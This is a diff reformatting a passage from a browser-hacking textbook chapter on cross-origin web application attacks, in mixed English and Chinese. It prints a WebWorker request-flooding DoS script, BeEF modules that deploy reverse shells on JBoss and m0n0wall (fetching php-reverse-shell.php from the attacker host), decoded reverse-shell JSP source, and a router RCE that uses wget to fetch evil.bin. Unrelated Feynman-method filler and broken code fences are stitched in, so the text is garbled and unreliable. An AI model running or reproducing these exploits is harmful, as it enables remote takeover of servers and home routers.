 Because the target is authenticated to [browservictim.com](http://browservictim.com), the SWF can issue authenticated requests to that same domain. As demonstrated in Figure 9-33, the requested authenticated resource is correctly retrieved, without any knowledge about cookies or credentials.
 
- start figure 
+start figure
 
 **Figure 9-33:** Attacker’s browser configured to use malaRIA proxy
 
 ![c09f033.tif](img/c09f033.png)
 
- end figure 
+end figure
 
 At this stage, you are effectively riding the target’s session. This example is using Flash, but you can obtain the same results with a malicious Silverlight widget.
 
@@ -11968,49 +12112,61 @@ When considering Denial-of-Service (DoS) attacks, most people think of a compute
 
 ## Web Application Pinch Points
 
+- [使用费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**理查德·费曼**。
 
-
-
--   [使用费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**理查德·费曼**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
+1. 运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
 
 ```
 if (condVar > someVal) {console.log("xxx")}
 ```
 
+`var url = "";`
 
+`var delay = 0;`
 
-var url = "";
-var delay = 0;
-var method = "";
-var post_data = "";
-var counter = 0;
+`var method = "";`
+
+`var post_data = "";`
+
+`var counter = 0;`
 
 /* gets the data via postMessage */
-onmessage = function (oEvent) {
- url = oEvent.data['url'];
- delay = oEvent.data['delay'];
- method = oEvent.data['method'];
- post_data = oEvent.data['post_data'];
- doRequest();
-};
+
+`onmessage = function (oEvent) {`
+
+`url = oEvent.data['url'];`
+
+`delay = oEvent.data['delay'];`
+
+`method = oEvent.data['method'];`
+
+`post_data = oEvent.data['post_data'];`
+
+`doRequest();`
+
+`};`
 
 /*prevents caching adding a random paramater to the URL*/
-function noCache(u){
- var result = "";
- if(u.indexOf("?") > 0){
+
+`function noCache(u){`
+
+`var result = "";`
+
+
+
+```javascript
+if(u.indexOf("?") > 0){
   result = "&" + Date.now() + Math.random();
- }else{
+}else{
   result = "?" + Date.now() + Math.random();
- }
- return result;
 }
+return result;
+}
+
 /* every <delay> milliseconds issue a
  * POST or GET request */
 function doRequest(){
  setInterval(function(){
-
   var xhr = new XMLHttpRequest();
   xhr.open(method, url + noCache(url));
   xhr.setRequestHeader('Accept','*/*');
@@ -12023,7 +12179,6 @@ function doRequest(){
     xhr.send(null);
   }
   counter++;
-
  },delay);
 
 /* every 10 seconds let the invoker know how
@@ -12036,7 +12191,7 @@ function doRequest(){
 
 If you inject this code into two different hooked browsers targeting the same Ruby web application from earlier in this section, you will see an increase in resource utilization. Figure 9-34 shows the system load during normal application usage.
 
- start figure 
+start figure 
 
 **Figure 9-34:** Normal system load
 
@@ -12046,7 +12201,7 @@ If you inject this code into two different hooked browsers targeting the same Ru
 
 After starting a WebWorker using the previous JavaScript code, you will see a slight increase in the load, as shown in Figure 9-35.
 
- start figure 
+start figure 
 
 **Figure 9-35:** System load with one hooked browser
 
@@ -12056,7 +12211,7 @@ After starting a WebWorker using the previous JavaScript code, you will see a sl
 
 You can see the difference in terms of system load in Figure 9-36, where another WebWorker has been started on a different hooked browser, sending POST requests every 10 milliseconds. The load changes so dramatically compared to Figure 9-35. This is because one browser is issuing POST requests, which results in a database insert statement. This happens at the same time as another hooked browser is issuing GET requests that result in a join operation across a data set that becomes bigger after each request. All this activity causes the load increase.
 
- start figure 
+start figure 
 
 **Figure 9-36:** System load with two hooked browsers
 
@@ -12110,9 +12265,6 @@ gateway + "password.cgi", "POST", [
 
 If this code executes successfully, you can connect to the target’s IP and log into the remote administrative interface with the new password. From there, you can then change the DNS server settings to anything you like.
 
-
-
-
 在 JBoss 中，JMX 通过一个易于使用的 Web 应用程序公开，通常位于 `/jmx-console` URI 处，默认情况下不需要身份验证。如果启用了身份验证，则只有 GET 或 POST 请求会被检查以确认是否可以访问 `/jmx-console` 资源。作为全面的渗透测试人员，我们知道除了 GET 或 POST 之外还有更多 HTTP 方法。例如，HEAD 请求在实践中具有与 GET 非常相似的功能。这意味着攻击者可以通过发送 HEAD 请求而不是 GET 或 POST 请求来绕过启用的 JMX 身份验证。
 
 在这些情况下，如果你有访问 JBoss JMX 控制台的权限，世界就在你掌握之中，36 也就是说。通过这种权限，你可以部署新的 Web 应用程序，形式为 WAR（Web Application Archive）文件或简单的 JSP（Java Server Pages）文件。例如，你可以部署一个 JSP 页面，它会 spawn 一个 bind 或反向 shell，该进程以 JBoss 用户的相同权限运行。
@@ -12120,25 +12272,20 @@ If this code executes successfully, you can connect to the target’s IP and log
 下面的代码片段是 BeEF 模块的示例，用于绕过 JMX 身份验证并部署反向 JSP 壳：
 
 ```beef.execute(function() {
-
    rhost = "<%= @rhost %>";
    rport = "<%= @rport %>";
    lhost = "<%= @lhost %>";
    lport = "<%= @lport %>";
    injectedCommand = "<%= @injectedCommand %>";
    jspName = "<%= @jspName %>";
-
    payload = "[…]";
-
     uri = "/jmx-console/HtmlAdaptor;index.jsp?action=invokeOp&name=\
 jboss.admin%3Aservice%3DDeploymentFileRepository&methodIndex=5&arg0=\
 %2Fconsole-mgr.sar/web-console.war%2F&arg1=" + jspName + "&arg2=.jsp\
 &arg3=" + payload + "&arg4=True";
-
 /* always use dataType: script when doing cross-origin XHR, 
 * otherwise even if the HTTP resp is 200, jQuery.ajax will always
 * launch the error() event*/
-
 beef.net.forge_request("http", "HEAD", rhost, rport, uri, null, null,
  null, 10, 'script', true, null,function(response){
 if(response.status_code == 200){
@@ -12150,24 +12297,11 @@ function(response){
         beef.net.send("<%= @command_url %>", <%= @command_id %>,
 “Reverse JSP shell triggered. Check your MSF handler listener."); 
      }else{
-        beef.net.send("<%= @command_url %>", <%= @command_id %>,
-“ERROR: second GET request failed.”);
-  }
-  });
-}
-
-// give the time to JBoss to deploy the JSP reverse shell
-setTimeout(triggerReverseConn,10000);
-
-}else{
-   beef.net.send("<%= @command_url %>", <%= @command_id %>,
-“ERROR: first HEAD request failed.”);
-         }
-    });
-});
 ```
 
-用于 JSP 反向 shell 的代码是 Metasploit 反向 JSP 壳的修改版本。payload 变量包含已 URL 编码的 JSP 源代码，解码后如下：
+
+
+用于 JSP 反向 shell 的代码是 Metasploit 反向 JSP 壳的修改版本。`payload` 变量包含已 URL 编码的 JSP 源代码，解码后如下：
 
 ```
 <%@page import="java.lang.*"%> 
@@ -12179,7 +12313,6 @@ setTimeout(triggerReverseConn,10000);
  StreamConnector( InputStream is, OutputStream os ) { 
   this.is = is; this.os = os; 
  } 
- 
  public void run() { 
   BufferedReader in  = null; 
   BufferedWriter out = null; 
@@ -12199,7 +12332,6 @@ setTimeout(triggerReverseConn,10000);
     out.close(); 
    }catch( Exception e ){} 
  }   
-
 try { 
  Socket socket = new Socket(lhost,lport); 
  Process process = Runtime.getRuntime().exec(injectedCommand); 
@@ -12212,26 +12344,22 @@ try {
 
 该 exploit 包含两个阶段：
 
-*   第一阶段是发送 HEAD 请求，并将编码的 JSP payload 与 `/jmx-console/HtmlAdaptor;index.jsp` URI 一起发送。使用 DeploymentFileRepository MBean（管理 Bean）来部署 JSP 到 JBoss。
-
-*   如果 HEAD 请求成功，则会调用 triggerReverseConn()，延迟 10 秒。这个延迟是为了给 JBoss 足够的时间部署 JSP。调用此函数会发出一个 GET 请求到先前部署的 JSP 页面。这一步是触发反向连接的关键，该连接指向 Metasploit 监听器中指定的 lhost 和 lport 变量。
+* 第一阶段是发送 `HEAD` 请求，并将编码的 JSP `payload` 与 `/jmx-console/HtmlAdaptor;index.jsp` URI 一起发送。使用 `DeploymentFileRepository` MBean（管理 Bean）来部署 JSP 到 JBoss。
+* 如果 `HEAD` 请求成功，则会调用 `triggerReverseConn()`，延迟 10 秒。这个延迟是为了给 JBoss 足够的时间部署 JSP。调用此函数会发出一个 `GET` 请求到先前部署的 JSP 页面。这一步是触发反向连接的关键，该连接指向 Metasploit 监听器中指定的 `lhost` 和 `lport` 变量。
 
 如果 exploit 执行成功，你现在应该拥有一个以 JBoss 用户身份运行的反向 shell。要观看此 exploit 的演示，请访问 [`browserhacker.com`](https://browserhacker.com) 并观看视频。
 
-**Cross-origin GlassFish Remote Command Execution**
+## Cross-origin GlassFish Remote Command Execution
 
-类似于 JBoss，Glassfish 也是另一个 Java 应用服务器。Roberto Suggi Liverani 发现（CVE-2012-0550）37 Glassfish 3.1.1 的 RESTful API 未受任何 anti-XSRF 令牌保护。这个问题可以通过 Glassfish 已经认证的管理员被诱导静默部署 WAR 到 GlassFish 服务器来利用，从而在前面的 JBoss 利用场景中实现相同的结果。
+类似于 JBoss，Glassfish 也是另一个 Java 应用服务器。Roberto Suggi Liverani 发现（CVE-2012-0550）Glassfish 3.1.1 的 RESTful API 未受任何 anti-XSRF 令牌保护。这个问题可以通过 Glassfish 已经认证的管理员被诱导静默部署 WAR 到 GlassFish 服务器来利用，从而在前面的 JBoss 利用场景中实现相同的结果。
 
-下面的代码片段是 Bart Leppens 编写的 BeEF 模块的一部分，可用于将任意 WAR 部署到 Glassfish 并实现以 Glassfish 用户身份执行命令。该 exploit 的最有趣之处是使用 XMLHttpRequest 对象进行跨源 multipart POST 请求，这是 Krzysztof Kotowicz 研究的技术：38
+下面的代码片段是 Bart Leppens 编写的 BeEF 模块的一部分，可用于将任意 WAR 部署到 Glassfish 并实现以 Glassfish 用户身份执行命令。该 exploit 的最有趣之处是使用 `XMLHttpRequest` 对象进行跨源 multipart POST 请求，这是 Krzysztof Kotowicz 研究的技术：
 
-
-
-
--   [Cross-origin m0n0wall 远程命令执行]
+- [Cross-origin m0n0wall 远程命令执行]
 
 The embedded firewall solution m0n0wall is based on FreeBSD. It can be used in either embedded devices like Soekris mainboards or old unused PCs. The m0n0wall web administration interface was susceptible to a post-authentication exploit, similar to the Glassfish example. Yann Cam discovered that the web administrative interface of m0n0wall 1.33 and prior versions lacked XSRF protection mechanisms.
 
-The web administration interface has many features, including the ability to execute raw commands as root. For exploitation, you’ll use a slightly different m0n0wall resource, exec_raw.php, which gives you more flexibility because it expects raw PHP code. The BeEF module that exploits this vulnerability uses Mark Lowe’s PHP shell for its reliability. The connection established between the webshell and a Netcat listener is quite stable. The shell is interactive, allowing you to carry on your penetration testing activities.
+The web administration interface has many features, including the ability to execute raw commands as root. For exploitation, you’ll use a slightly different m0n0wall resource, `exec_raw.php`, which gives you more flexibility because it expects raw PHP code. The BeEF module that exploits this vulnerability uses Mark Lowe’s PHP shell for its reliability. The connection established between the webshell and a Netcat listener is quite stable. The shell is interactive, allowing you to carry on your penetration testing activities.
 
 The following code snippet shows the instructions used to exploit an authenticated m0n0wall web administration interface from a hooked browser:
 
@@ -12241,14 +12369,12 @@ beef.execute(function() {
   var rport = '<%= @rport %>';
   var lhost = '<%= @lhost %>';
   var lport = '<%= @lport %>';
-
   var uri = "http://" + rhost + ":" + rport + "/exec_raw.php? \
 cmd=echo%20-e%20%22%23%21%2Fusr%2Flocal%2Fbin%2Fphp%5Cn%3C%3Fphp%20 \
 eval%28%27%3F%3E%20%27.file_get_contents%28%27http%3A%2F%2F" + \
 beef.net.host + ":" + beef.net.port + "%2Fphp-reverse-\
 shell.php%27%29.%27%3C%3Fphp%20%27%29%3B%20%3F%3E%20%3E%20 \
 x.php%3Bcat%20x.php%3Bchmod%20755%20x.php%3B";
-
   beef.net.forge_request("http", "GET", rhost, rport, uri, null, 
   null, null, 10, 'script', true, null, function(response){
     if(response.status_code == 200){
@@ -12257,35 +12383,29 @@ x.php%3Bcat%20x.php%3Bchmod%20755%20x.php%3B";
 "/x.php?ip=" + lhost + "&port=" + lport, null, null, null, 10, 
  'script', true, null, function(response){
           if(response.status_code == 200){
-            beef.net.send("<%= @command_url %>", <%=  
-@command_id %>,"result=OK: Reverse shell should have been triggered.");
+            beef.net.send("<%= @command_url %>", <%= @command_id %>,"result=OK: Reverse shell should have been triggered.");
           }else{
-            beef.net.send("<%= @command_url %>", <%=  
-@command_id %>,"result=ERROR: second GET request failed.");
+            beef.net.send("<%= @command_url %>", <%= @command_id %>,"result=ERROR: second GET request failed.");
           }
         });
       }
       setTimeout(triggerReverseConn,5000);
     }else{
-      beef.net.send("<%= @command_url %>", <%= @command_id  
-%>,"result=ERROR: first GET request failed.");
+      beef.net.send("<%= @command_url %>", <%= @command_id %>,"result=ERROR: first GET request failed.");
     }
   });
-    
-
 });
 ```
 
 The code is URL decoding the content of the `uri` variable by using the `exec_raw.php` resource, which is available by default in every m0n0wall installation:
 
+```
+/exec_raw.php?cmd=echo -e "#!/usr/local/bin/php\n \n <?php eval('?> '.file_get_contents('http://\" +  \n beef.net.host + ":" + beef.net.port + \n\"/php-reverse-shell.php\').'<?php '); ?> > \n        x.php;cat x.php;chmod 755 x.php;"
+```
 
+The reverse shell content hosted on the BeEF server is retrieved using PHP’s `file_get_contents`. Its content is then added to the `x.php` file on the target and the file permissions are then adjusted. This stage occurs with the first GET request.
 
-
-/exec_raw.php?cmd=echo -e "#!/usr/local/bin/php\n \n <?php eval('?> '.file_get_contents('http://\" +  \n beef.net.host + ":" + beef.net.port + \n\"/php-reverse-shell.php\').'<?php '); ?> > \n        x.php;cat x.php;chmod 755 x.php;"```
-
-The reverse shell content hosted on the BeEF server is retrieved using PHP’s file_get_contents. Its content is then added to the x.php file on the target and the file permissions are then adjusted. This stage occurs with the first GET request.
-
-In the meantime, a simple Netcat socket is listening on lhost and lport on your machine. To trigger the reverse shell connection, a second GET request is then issued, requesting the x.php file created previously. If the exploit was successful, you should now have remote root access on the vulnerable m0n0wall device.
+In the meantime, a simple Netcat socket is listening on `lhost` and `lport` on your machine. To trigger the reverse shell connection, a second GET request is then issued, requesting the `x.php` file created previously. If the exploit was successful, you should now have remote root access on the vulnerable m0n0wall device.
 
 The m0n0wall web administration interface vulnerability is due to the lack of XSRF protective mechanisms, which results in the web application trusting cross-origin requests. Also, exploitation relies on the target being logged in to the application, and this can be determined using the techniques discussed earlier in this chapter. To see a demonstration of this exploit, visit [`browserhacker.com`](https://browserhacker.com) and watch the video.
 
@@ -12295,7 +12415,7 @@ Home routers usually run embedded versions of Linux, frequently on MIPS architec
 
 ### Pre-authentication Remote Command Execution
 
-Michal Sajdak discovered42 that a popular router in Poland, the Asmax AR 804, was vulnerable to RCE pre-authentication. The following JavaScript demonstrates exploitation of the flaw:
+Michal Sajdak discovered that a popular router in Poland, the Asmax AR 804, was vulnerable to RCE pre-authentication. The following JavaScript demonstrates exploitation of the flaw:
 
 ```
 var gateway = '192.168.0.1'; 
@@ -12312,35 +12432,31 @@ img.src = gateway+path+cmd;
 document.body.appendChild(img);
 ```
 
-The commands available in the router included wget; this is exploited in the code snippet to download evil.bin from browserhacker.com into the /var/tmp folder. To exacerbate the vulnerability, every process on the router, including the web server, was running as root as you can see from Figure 9-37.
-
- start figure 
+The commands available in the router included `wget`; this is exploited in the code snippet to download `evil.bin` from `browserhacker.com` into the `/var/tmp` folder. To exacerbate the vulnerability, every process on the router, including the web server, was running as root as you can see from Figure 9-37.
 
 **Figure 9-37:** Every process on the Asmax router runs as root.
 
 ![c09f037.eps](img/c09f037.png)
 
- end figure 
+
 
 RCE vulnerabilities including direct access to a router’s BusyBox interface have been used maliciously in the wild. One of the first appearances of a botnet made with SOHO routers dates back to 2008, and was known as PsyBot. According to Terry Baume43, the botnet was mainly composed of Netcom NB5 routers.
 
 A popular version of the firmware in those devices did not enforce any authentication on the web user interface, allowing the attackers to enable Telnet administration on the router. Once Telnet was accessible, the attacks then executed the comment in Figure 9-38.
 
- start figure 
+start figure
 
 **Figure 9-38:** PsyBot infection first command
 
 ![c09f038.tif](img/c09f038.png)
 
- end figure 
+end figure
 
 As you can see in Figure 9-38, the following is occurring:
 
-*   The udhcpc.env file is downloaded into /var/tmp with wget
-
-*   The file is then set to be executable by the chmod command
-
-*   The file is then executed in the background
+* The `udhcpc.env` file is downloaded into `/var/tmp` with `wget`
+* The file is then set to be executable by the `chmod` command
+* The file is then executed in the background
 
 The executable is compiled for MIPS and, once executed, connects to one of the IRC command and control botnet servers run by the attackers. The same attack vector could be used against the RCE vulnerability described earlier for the Asmax routers, as it was pre-authentication and every command would run with root privileges.
 
@@ -12398,18 +12514,15 @@ fileUpload("http://192.168.0.1/upgrade.cgi",
 "[..firmware binary..]", "myFile.gif");
 ```
 
-Executing this code, you are able to update the firmware of a Linksys WRT54GL with the raw data passed as the second argument to the fileUpload() function.
+Executing this code, you are able to update the firmware of a Linksys WRT54GL with the raw data passed as the second argument to the `fileUpload()` function.
 
 Modifying the existing router firmware and back-dooring it with your own code isn’t as difficult as you might think! You just need the right tools.
 
-Craig Heffner, creator of binwalk45, together with Jeremy Collake, created the Firmware Modification Kit.46 This collection of Bash scripts can be used to unpack the router firmware in order to obtain the file system files tree. Then you can read every file, modify them by inserting your backdoor code, and then repack everything as a single file ready to be used with the attacks described earlier.
+Craig Heffner, creator of `binwalk`45, together with Jeremy Collake, created the Firmware Modification Kit.46 This collection of Bash scripts can be used to unpack the router firmware in order to obtain the file system files tree. Then you can read every file, modify them by inserting your backdoor code, and then repack everything as a single file ready to be used with the attacks described earlier.
 
 Robert Kornmeyer, in mid-2013, published an article on PaulDotCom47 showing how you could backdoor a DD-WRT firmware for Linksys routers using the Firmware Modification Kit. He was able to modify the Info.htm page source to include the BeEF hook, as you can see in Figure 9-39.
 
- start figure 
-
-
-
+start figure
 
 # 图 9-39: 使用 BeEF 钩子后门的 DD-WRT
 
@@ -12441,46 +12554,43 @@ Robert Kornmeyer, in mid-2013, published an article on PaulDotCom47 showing how 
 
 <x0.2965><y0.875>This chapter has detailed a range of web application attack scenarios that can be launched from the hooked browser, many of which can be performed across origins without violating the SOP. The methods covered afford you as the attacker an increased level of anonymity and provide access to non-routable web applications residing on intranets.
 
-<x0.2965><y0.8992>Approaches to identify and exploit vulnerabilities cross-origin have also been discussed. These included Remote Command Execution (RCE), SQL injection, and Cross-site Scripting attacks (XSS).
 
-<x0.2965><y0.9242>You now know how hooking origins employing XSS vulnerabilities (discovered cross-origin) could expand the number of origins under your control and increase the attack surface. Once hooked, the newly controlled origin could be accessed via a Tunneling Proxy. This allows you to potentially ride an authenticated session and bypass some mitigations using HttpOnly. Standard security tools, like Burp and Sqlmap, could also use the Tunneling Proxy to relay their request via the hooked browser.
 
-<x0.2965><y0.9492>This chapter also showed that standard web application exploits could be launched cross-origin. These attacks can exploit RCE vulnerabilities on devices located on the intranet.
+Approaches to identify and exploit vulnerabilities cross-origin have also been discussed. These included Remote Command Execution (RCE), SQL injection, and Cross-site Scripting attacks (XSS).
 
-<x0.2965><y0.9742>In the next chapter, you further explore taking advantage of hooked browsers positioned within internal networks. The attacks covered demonstrate how to compromise non-web services using Inter-protocol Communication and Exploitation, along with other methods.
+You now know how hooking origins employing XSS vulnerabilities (discovered cross-origin) could expand the number of origins under your control and increase the attack surface. Once hooked, the newly controlled origin could be accessed via a Tunneling Proxy. This allows you to potentially ride an authenticated session and bypass some mitigations using HttpOnly. Standard security tools, like Burp and Sqlmap, could also use the Tunneling Proxy to relay their request via the hooked browser.
+
+This chapter also showed that standard web application exploits could be launched cross-origin. These attacks can exploit RCE vulnerabilities on devices located on the intranet.
+
+In the next chapter, you further explore taking advantage of hooked browsers positioned within internal networks. The attacks covered demonstrate how to compromise non-web services using Inter-protocol Communication and Exploitation, along with other methods.
 
 # Questions
 
-<x0.2965><y1.0094>Level1 **1.** What are preflight requests? **2.** How does cross-origin web application fingerprinting work? Is it respecting or violating the Same Origin Policy? **3.** How do you blindly hook a new domain? Describe an example. **4.** Is there a way to detect if the user is logged in to a web application, respecting the Same Origin Policy? **5.** Why can combining an XSRF vulnerability with a Cross-domain request potentially have devastating effects? How would a pseudo-random anti-XSRF token mitigate that? **6.** Which type of SQL injection is possible to detect cross-origin, respecting the Same Origin Policy? Is it blind or not? **7.** How is it possible to proxy HTTP requests through the hooked browser? **8.** Describe how the GlassFish exploit (CVE-2012-0550) explained in the last section of the chapter works. Are there any caveats? **9.** How can you exploit a liberal cross-origin policy, which allows access from all domains? Describe a practical example. **10.** Provide an example of a web application pinch point.
+Level1 **1.** What are preflight requests? **2.** How does cross-origin web application fingerprinting work? Is it respecting or violating the Same Origin Policy? **3.** How do you blindly hook a new domain? Describe an example. **4.** Is there a way to detect if the user is logged in to a web application, respecting the Same Origin Policy? **5.** Why can combining an XSRF vulnerability with a Cross-domain request potentially have devastating effects? How would a pseudo-random anti-XSRF token mitigate that? **6.** Which type of SQL injection is possible to detect cross-origin, respecting the Same Origin Policy? Is it blind or not? **7.** How is it possible to proxy HTTP requests through the hooked browser? **8.** Describe how the GlassFish exploit (CVE-2012-0550) explained in the last section of the chapter works. Are there any caveats? **9.** How can you exploit a liberal cross-origin policy, which allows access from all domains? Describe a practical example. **10.** Provide an example of a web application pinch point.
 
-<x0.2965><y1.0977>For answers to the questions please refer to the book’s website at [`browserhacker.com/answers`](https://browserhacker.com/answers) or the Wiley website at: [www.wiley.com/go/browserhackershandbook](http://www.wiley.com/go/browserhackershandbook).<x0.7035><y1.1094>
+For answers to the questions please refer to the book’s website at [`browserhacker.com/answers`](https://browserhacker.com/answers) or the Wiley website at: [www.wiley.com/go/browserhackershandbook](http://www.wiley.com/go/browserhackershandbook).
 
-**Notes**
+## Notes
 
-<x0.3352><y1.1219><class_Section-header>
+1\. Mozilla Developer Network. (2013). HTTP access control (CORS). Retrieved June 15, 2013 from [`developer.mozilla.org/en-US/docs/HTTP/Access_control_CORS`](https://developer.mozilla.org/en-US/docs/HTTP/Access_control_CORS)
 
-1\. Mozilla Developer Network. (2013). HTTP access control (CORS). Retrieved June 15, 2013 from [`developer.mozilla.org/en-US/docs/HTTP/Access_control_CORS`](https://developer.mozilla.org/en-US/docs/HTTP/Access_control_CORS)<x0.7035><y1.1403>
+2\. W3C. (2013). Cross-origin Resource sharing Terminology. Retrieved June 15, 2013 from [`www.w3.org/TR/cors/#simple-method`](http://www.w3.org/TR/cors/#simple-method)
 
-2\. W3C. (2013). Cross-origin Resource sharing Terminology. Retrieved June 15, 2013 from [`www.w3.org/TR/cors/#simple-method`](http://www.w3.org/TR/cors/#simple-method)<x0.7035><y1.1656>
+3\. W3C. (2013). Cross-origin Resource sharing Terminology. Retrieved June 15, 2013 from [`www.w3.org/TR/cors/#simple-header`](http://www.w3.org/TR/cors/#simple-header)
 
-3\. W3C. (2013). Cross-origin Resource sharing Terminology. Retrieved June 15, 2013 from [`www.w3.org/TR/cors/#simple-header`](http://www.w3.org/TR/cors/#simple-header)<x0.7035><y1.1909>
+4\. BeEF Project. (2012). Internal Network Fingerprinter. Retrieved October 8, 2013 from [`github.com/beefproject/beef/tree/master/modules/network/internal_network_fingerprinting`](https://github.com/beefproject/beef/tree/master/modules/network/internal_network_fingerprinting)
 
-4\. BeEF Project. (2012). Internal Network Fingerprinter. Retrieved October 8, 2013 from [`github.com/beefproject/beef/tree/master/modules/network/internal_network_fingerprinting`](https://github.com/beefproject/beef/tree/master/modules/network/internal_network_fingerprinting)<x0.7035><y1.2164>
+5\. Chris Sullo. (2010). CMS Explorer. Retrieved June 15, 2013 from [`code.google.com/p/cms-explorer/`](http://code.google.com/p/cms-explorer/)
 
-5\. Chris Sullo. (2010). CMS Explorer. Retrieved June 15, 2013 from [`code.google.com/p/cms-explorer/`](http://code.google.com/p/cms-explorer/)<x0.7035><y1.2414>
+6\. Sky. (2012). Sagem router firmware. Retrieved October 8, 2013 from [`www.skyuser.co.uk/skyinfo/the_sagem_f_st_2504_router_gets_a_new_fw.html`](http://www.skyuser.co.uk/skyinfo/the_sagem_f_st_2504_router_gets_a_new_fw.html)
 
-6\. Sky. (2012). Sagem router firmware. Retrieved October 8, 2013 from [`www.skyuser.co.uk/skyinfo/the_sagem_f_st_2504_router_gets_a_new_fw.html`](http://www.skyuser.co.uk/skyinfo/the_sagem_f_st_2504_router_gets_a_new_fw.html)<x0.7035><y1.2664>
+7\. Gareth Heyes. (2007). JS Lan Scanner. Retrieved October 8, 2013 from [`code.google.com/p/jslanscanner/source/browse/trunk/lan_scan/js/lan_scan.js`](http://code.google.com/p/jslanscanner/source/browse/trunk/lan_scan/js/lan_scan.js)
 
-7\. Gareth Heyes. (2007). JS Lan Scanner. Retrieved October 8, 2013 from [`code.google.com/p/jslanscanner/source/browse/trunk/lan_scan/js/lan_scan.js`](http://code.google.com/p/jslanscanner/source/browse/trunk/lan_scan/js/lan_scan.js)<x0.7035><y1.2911>
+8\. Mike Cardwell. (2011). Abusing HTTP Status Codes to Expose Private Information. Retrieved June 15, 2013 from [`grepular.com/Abusing_HTTP_Status_Codes_to_Expose_Private_Information`](https://grepular.com/Abusing_HTTP_Status_Codes_to_Expose_Private_Information)
 
-8\. Mike Cardwell. (2011). Abusing HTTP Status Codes to Expose Private Information. Retrieved June 15, 2013 from [`grepular.com/Abusing_HTTP_Status_Codes_to_Expose_Private_Information`](https://grepular.com/Abusing_HTTP_Status_Codes_to_Expose_Private_Information)<x0.7035><y1.3164>
+9\. H. Meer and M. Slaviero. (2007). It’s all about timing. Retrieved June 15, 2013 from [`www.defcon.org/images/defcon-15/dc15-presentations/Meer_and_Slaviero/Whitepaper/dc-15-meer_and_slaviero-WP.pdf`](http://www.defcon.org/images/defcon-15/dc15-presentations/Meer_and_Slaviero/Whitepaper/dc-15-meer_and_slaviero-WP.pdf)
 
-9\. H. Meer and M. Slaviero. (2007). It’s all about timing. Retrieved June 15, 2013 from [`www.defcon.org/images/defcon-15/dc15-presentations/Meer_and_Slaviero/Whitepaper/dc-15-meer_and_slaviero-WP.pdf`](http://www.defcon.org/images/defcon-15/dc15-presentations/Meer_and_Slaviero/Whitepaper/dc-15-meer_and_slaviero-WP.pdf)<x0.7035><y1.3414>
-
-10\. P. Watkins. (2001). Cross-site Request Forgeries. Retrieved June 15, 2013 from [`www.tux.org/~peterw/csrf.txt`](http://www.tux.org/~peterw/csrf.txt)<x0.7035><y1.3664>
-
-
-
+10\. P. Watkins. (2001). Cross-site Request Forgeries. Retrieved June 15, 2013 from [`www.tux.org/~peterw/csrf.txt`](http://www.tux.org/~peterw/csrf.txt)
 
 12. `Chris Shiflett`. (2004). `Cross-Site Request Forgeries`. Retrieved `June 15, 2013` from `http://shiflett.org/articles/cross-site-request-forgeries`
 
@@ -12520,6 +12630,8 @@ Robert Kornmeyer, in mid-2013, published an article on PaulDotCom47 showing how 
 
 30. `n.runs AG`. (2011). `Denial of Service through hash table multi-collisions`. Retrieved `June 15, 2013` from `https://www.nruns.com/_downloads/advisory28122011.pdf`
 
+
+
 31. `Fortify`. (2012). `Web Server DoS by Hash Collision`. Retrieved `June 15, 2013` from `http://web.archive.org/web/20120120043647/http://blog.fortify.com/blog/Vulnerabilities-Breaches/2012/01/04/Web-Server-DoS-by-Hash-Collision`
 
 32. `R. Regan`. (2011). `Java HangsWhen Converting 2.2250738585072012e-308`. Retrieved `October 8, 2013` from `http://www.exploringbinary.com/java-hangs-when-converting-2-2250738585072012e-308/`
@@ -12530,13 +12642,13 @@ Robert Kornmeyer, in mid-2013, published an article on PaulDotCom47 showing how 
 
 35. `T. Donev`. (2011). `Comtrend ADSL Router (CT-5367) C01_R12 Remote Root`. Retrieved `October 8, 2013` from `http://www.exploit-db.com/exploits/16275/`
 
-36. `Wikipedia`. (1983). `Scarface`. Retrieved `June 15, 2013` from `https://en.wikipedia.org/wiki/Scarface_(1983_film)``)
+36. `Wikipedia`. (1983). `Scarface`. Retrieved `June 15, 2013` from `https://en.wikipedia.org/wiki/Scarface_(1983_film)`
 
 37. `R. Suggi Liverani`. (2012). `Oracle Glassfish REST Interface—Cross-site Request Forgery Vulnerability`. Retrieved `June 15, 2013` from `http://www.security-assessment.com/files/documents/advisory/Oracle_GlassFish_Server_REST_CSRF.pdf`
 
 38. `K. Kotowicz`. (2011). `How to upload arbitrary file contents cross-domain`. Retrieved `June 15, 2013` from `http://blog.kotowicz.net/2011/04/how-to-upload-arbitrary-file-contents.html`
 
-39. `Mozilla Developer Network`. (2013). `XMLHttpRequest`. Retrieved `June 15, 2013` from `https://developer.mozilla.org/en-US/docs/DOM/XMLHttpRequest#sendAsBinary()``)
+39. `Mozilla Developer Network`. (2013). `XMLHttpRequest`. Retrieved `June 15, 2013` from `https://developer.mozilla.org/en-US/docs/DOM/XMLHttpRequest#sendAsBinary()`
 
 40. `Y. Cam`. (2012). `m0n0wall 1.33 Cross-site Request Forgery Vulnerability`. Retrieved `June 15, 2013` from `http://1337day.com/exploit/19906`
 
@@ -12552,55 +12664,40 @@ Robert Kornmeyer, in mid-2013, published an article on PaulDotCom47 showing how 
 
 46. `C. Heffner` and `J. Collake`. (2013). `Firmware Modification Kit`. Retrieved `October 8, 2013` from `https://code.google.com/p/firmware-mod-kit/`
 
-47. `R. Kornmeyer`. (2013). `Creating Malicious Firmware with Firmware-Mod-Kit`. Retrieved `October 8, 2013` from `http://pauldotcom.com/2013/06/creating-malicious-firmware-wi.html`
+47. `R. Kornmeyer`. (2013). `Creating Malicious Firmware with Firmware-Mod-Kit`. Retrieved `June 15, 2013` from `http://pauldotcom.com/2013/06/creating-malicious-firmware-wi.html`
 
-# *Chapter 10*
+# Chapter 10
 
-# *Attacking Networks*
+# Attacking Networks
 
+- [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
 
-
--   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
+1. 运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
 
 ```
 if (condVar > someVal) {console.log("xxx")}
 ```
 
-
-
